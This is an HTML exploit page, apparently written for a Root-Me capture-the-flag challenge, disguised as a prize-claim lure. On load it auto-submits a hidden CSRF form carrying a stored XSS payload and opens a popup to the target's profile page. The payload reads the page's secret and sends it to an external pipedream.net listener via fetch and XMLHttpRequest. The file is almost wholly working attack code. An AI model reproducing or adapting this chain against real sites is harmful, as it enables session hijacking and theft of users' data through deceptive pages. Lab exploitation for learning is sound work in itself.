<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Congratulations! Claim Your Prize Now.</title>
    <style>
        body { font-family: 'Inter', sans-serif; text-align: center; padding-top: 50px; background-color: #1f2937; color: #f9fafb; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #374151; padding: 2.5rem; border-radius: 0.75rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5); max-width: 400px; width: 90%; }
        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #a5b4fc; }
        p { margin-bottom: 1.5rem; font-size: 0.9rem; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #818cf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 1.5rem auto 0; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="card">
        <h1>Initiating Session Validation...</h1>
        <p>Please wait a few seconds. Do not close this window.</p>
        <div class="spinner"></div>

        <!-- --- ÉTAPE 1 : FORMULAIRE CSRF (Masqué et soumis automatiquement) --- -->
        <form id="csrfForm" method="POST" action="http://challenge01.root-me.org:58003/login" style="display: none;">
            <input type="hidden" name="username" id="username">
        </form>
    </div>

    <script>
        const CHALLENGE_DOMAIN = "http://challenge01.root-me.org:58003";
        const VULNERABLE_PAGE = "/profile";
        
        // --- FIX DE LA CHAÎNE XSS ---
        // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
        const MALICIOUS_PAYLOAD = "<script>" +
            "setTimeout(function() {" +
                "var section = document.querySelector('section');" + 
                "if (section) {" +
                    "var text = section.innerText;" + 
                    // 1. Extrait le secret en se basant sur le texte d'ancrage "Your secret:"
                    "var secret = text.split('Your secret:')[1].trim();" + 
                    
                    // 2. Encode le secret pour l'URL
                    "var encodedSecret = encodeURIComponent(secret);" +
                    
                    // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
                    "var exfil_url = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +

                    // The request is sent, but if the response doesn't have the correct
                    // CORS header (Access-Control-Allow-Origin), the JavaScript will get an error,
                    // but the data still reaches the listener (the server) before the error occurs.
                    "fetch(exfil_url, { mode: 'no-cors' }).catch(e => console.log('Exfiltration request sent (CORS error expected).'));" +

                    // Example using XMLHttpRequest (XHR)
                    "var xhr = new XMLHttpRequest();" +
                    'xhr.open("GET", exfil_url, true);' + 
                    "xhr.send();" +
                    
                    "console.log('Secret exfiltrated! Check your listener logs.');" +
                "} else {" +
                    "console.error('Exfiltration Error: Section not found.');" +
                "}" +
            "}, 1500);</script>";
        
        // --- Exécution de l'attaque ---

        // PHASE 1 : CSRF (Amorçage de session)
        function executeCsrf() {
            // Définit la valeur malveillante dans le champ de formulaire masqué
            document.getElementById('username').value = MALICIOUS_PAYLOAD;

            // Soumet automatiquement le formulaire au domaine cible, en envoyant les cookies de l'Admin.
            fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_executed');

            setTimeout(function() {
              document.getElementById('csrfForm').submit();
              console.log("Phase 1: CSRF POST submitted. Payload stored in Admin's session.");        
            }, 1000);
        }

        function executeOpenerDelivery() {
            // 1. Ouvre un nouvel onglet vers le domaine cible pour établir la relation 'opener'.
            const targetWindow = window.open('about:blank', '_blank');

            if (targetWindow) {
                console.log("Phase 2: Target window opened.");

                // 2. Redirige la fenêtre cible vers la page vulnérable.
                targetWindow.location = CHALLENGE_DOMAIN + VULNERABLE_PAGE;
                console.log("Phase 2: Redirected target to vulnerable page /profile.");
            } else {
                console.error("Popup blocked! Attack failed.");
                document.querySelector('.card h1').textContent = "Attack Failed!";
                document.querySelector('.card p').textContent = "Please disable your popup blocker and try again.";
            }
        }

        // --- Enchaînement des étapes d'attaque ---

        // 1. Exécute le CSRF immédiatement au chargement pour stocker le payload.
        executeCsrf();

        setTimeout(executeOpenerDelivery, 1000);
    </script>
</body>
</html>
